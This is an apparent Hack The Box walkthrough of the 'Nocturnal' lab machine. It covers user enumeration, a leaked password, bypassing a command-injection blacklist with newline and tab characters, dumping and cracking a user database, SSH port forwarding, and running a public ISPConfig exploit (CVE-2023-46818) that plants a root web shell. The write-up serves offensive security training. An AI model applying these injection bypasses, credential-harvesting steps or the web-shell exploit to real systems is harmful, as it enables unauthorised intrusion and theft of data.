---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - Command-Injection
  - ISPConfig
  - Port-Forwarding
---
# Overview

| Name        | Nocturnal |
| ----------- | --------- |
| OS          | Linux     |
| Base Points | Easy [20] |
| Status      | Done      |

---
# Recon
## Nmap

```bash
└─$ nmap -A -sC -sV -Pn 10.10.11.64

Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 06:30 EDT
Nmap scan report for nocturnal.htb (10.10.11.64)
Host is up (0.017s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Welcome to Nocturnal
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Only 2 port `SSH` and Web Server at `80`
## Directory Enumeration

```bash
└─$ gobuster dir -u http://nocturnal.htb/ -w /usr/share/wordlists/dirb/common.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nocturnal.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin.php            (Status: 302) [Size: 0] [--> login.php]
/backups              (Status: 301) [Size: 178] [--> http://nocturnal.htb/backups/]
/index.php            (Status: 200) [Size: 1524]
/uploads              (Status: 403) [Size: 162]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

- After Loggin in to site there seems to be `File Upload`.
- `Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.`
- Tried uploading files by changing extension but didnt worked.
# Exploitation

- When I uploaded a `.odt` or other available file in my files section it showed this endpoint.

![[endpoint.png]]

- Further look into the web reveal endpoint when downloading the file `/view.php?username=test1&file=sample.pdf`. The `username` parameter will be use as a point to enumerate user that available in this web application.

![[burp.png]]
### User Enumeration

```bash
└─$ ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -u 'http://nocturnal.htb/view.php?username=FUZZ&file=test.pdf' -H 'Cookie: PHPSESSID=olt58v8arrqqotc1ckci6q7qlq' -fs 2985


        /___\  /___\           /___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=test.pdf
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/Names/names.txt
 :: Header           : Cookie: PHPSESSID=olt58v8arrqqotc1ckci6q7qlq
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2985
________________________________________________

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 21ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 15ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 17ms]
:: Progress: [10177/10177] :: Job [1/1] :: 2173 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

- If I now go to `http://nocturnal.htb/view.php?username=amanda&file=test.pdf` we will get available file for download which is `privacy.odt`.
- P.S Tried for other `admin` and `tobias` but they had nothing.
- If we try to see file using `Libre Office`, We get this:

```
Dear Amanda,

Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.

The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.

Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.

  

Yours sincerely,

Nocturnal's IT team
```

- We got password for amanda `arHkG7HAI68X8s1J`.
- Now Login to Site ( For just curiosity tried this creds in SSH also but didnt worked).
- Amanda seems to have access to `Admin` Panel.

![[noc.png]]

- There is an option to enter backup password maybe we could do command injection there.
- If we try normal `pass;ls`  these simple payload it gives `Error: Try another password.`
- Good thing is we can view `admin.php` by just clicking in it.

```php
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}
```

- But this can be easily bypass with `\r\n` where this will be the point to split the command to execute another one and `\t` as substitute to space that has been blacklists.
- GPT Thank You.

![[burpp.png]]

- You can replace `/` with `\n`

- Sometimes it may not work so at that time just send request 4-5 times.

![[red.png]]

- Upon enumerating i found folder `nocturnal_databases`

![[burppp.png]]

- Most interesting file is `nocturnal_database.db` inside that folder. It might have hashes or password, username of user.
- Insert a real `TAB` between  and the file path (not 4 spaces) because it also has space filter or you can also use `%09`.
- Again saying if command doesn't work one time sending it atleast 4-5 times IDK if its bug or what.
- Tried using `cat` but it doesnt give anything it shows:

```
<pre></pre>
```

- Asked GPT it said to use `base64` to dump it.

![[idk.png]]

- Copied the base64 whole text and putted in `db.b64 base64 -d db.b64 > nocturnal.db` Used this to decode it to normal `.db` format.

```bash
~/Hentai/HTB ❯ sqlite3 nocturnal.db
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
uploads  users  
sqlite> SELECT * FROM users;
1|admin|d725aeba143f575736b07e045d8ceebb
2|amanda|df8b20aa0c935023f99ea58358fb63c4
4|tobias|55c82b1ccd55ab219b3b109b07d5061d
6|kavi|f38cde1654b39fea2bd4f72f1ae4cdda
7|e0Al5|101ad4543a96a7fd84908fd0d802e7db
8|p4rson|68238cd792d215bdfdddc7bbb6d10db4
9|p4rs0n|68238cd792d215bdfdddc7bbb6d10db4
sqlite> 
```

- Nice now we got hash Lets go to [crackstation](https://crackstation.net/), If it doesnt find then maybe we can use hashcat.
- Nice we got password of  `tobias` which is `slowmotionapocalypse` , `kavi` which is `kavi` and `p4rson` which is `parrot`
- Now we can `SSH` into them.
## User

```bash
~/Hentai/HTB ❯ ssh tobias@10.10.11.64            
tobias@10.10.11.64s password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-212-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 11 Jun 2025 11:51:36 AM UTC

  System load:           0.05
  Usage of /:            55.7% of 5.58GB
  Memory usage:          15%
  Swap usage:            0%
  Processes:             229
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.64
  IPv6 address for eth0: dead:beef::250:56ff:feb0:8e97


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Jun 11 11:51:38 2025 from 10.10.14.119
tobias@nocturnal:~$ ls
user.txt
tobias@nocturnal:~$ cat user.txt
cebd44bfb02f267ae5049b89579addcf
```
## Privilege Escalation

- Okay so we cant run `sudo -l` lets check which ports are open.

```bash
tobias@nocturnal:~$ netstat -tunl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:*                          
tobias@nocturnal:~$ 
```

- Port `8080` as open so we can do port forwarding like on [[Planning]]. (Tried port `80` but it was just `nocturnal.htb` site)

```bash
~/Hentai/HTB ❯ ssh -L 8000:127.0.0.1:8080 tobias@10.10.11.64

tobias@10.10.11.64's password: 
```

- First here is `8000` our machine port which we want site to load on main machine, second port `8080` is of target which we want to port forward.
- Now visit `http://127.0.0.1:8000/`
- Asked GPT it said:

- **Default username:** `admin` (always created during ISPConfig install)
    
- **Password:** You are required to **set your own password** during installation.
    
    - There is **no fixed default password** like `admin` or `1234` unless you installed from an unofficial auto-install script that sets one for you.

 - So we can use username as `admin` and password as from which we logged into tobias SSH `slowmotionapocalypse`.

![[ispconfig.png]]

- Version is `3.2.10p1` searched this `ispconfig 3.2.10p1 exploit github`.
- Got [this](https://github.com/projectdiscovery/nuclei-templates/issues/8804)
- `CVE-2023-46818` This was the CVE. Got [this](https://github.com/blindma1den/CVE-2023-46818-Exploit) POC. 
## Root

```bash
~/Hentai/HTB/nocturnal/CVE-2023-46818-Exploit main 39s ❯ python3 exploit.py http://127.0.0.1:8000/ admin slowmotionapocalypse

[+] Logging in as 'admin'
[+] Login successful.
[+] Injecting PHP shell...
[+] Shell dropped at 'sh.php'
[+] Web shell ready. Type commands below. Ctrl+C or 'exit' to quit.

ispconfig-shell# whoami

rootispconfig-shell# sudo find / -type f -name "root.txt" 2>/dev/null
/root/root.txt

ispconfig-shell# cat /root/root.txt
fa67fb8d17f33dc4c3ffde99b31db8b0
```

---













